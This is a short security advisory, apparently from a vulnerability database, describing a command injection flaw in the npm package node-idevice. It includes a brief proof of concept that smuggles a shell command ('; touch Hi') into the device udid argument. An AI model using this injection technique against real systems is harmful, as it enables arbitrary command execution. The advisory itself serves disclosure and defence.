# Overview

node-idevice is a package to install apps to iOS devices via node.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char while [declaring](https://github.com/OniOni/node-idevice/blob/master/main.js#L8) the `udid` on `IDevice`(see PoC).
It is then executed with any function calling `IDevice.prototype.list`.

https://www.npmjs.com/package/node-idevice

# Proof of Concept

```javascript
var idevice = require('node-idevice');
var device = new idevice("; touch Hi #//");

device.isInstalled("hacked", function (err, installed) {
        console.log("done");
});
```
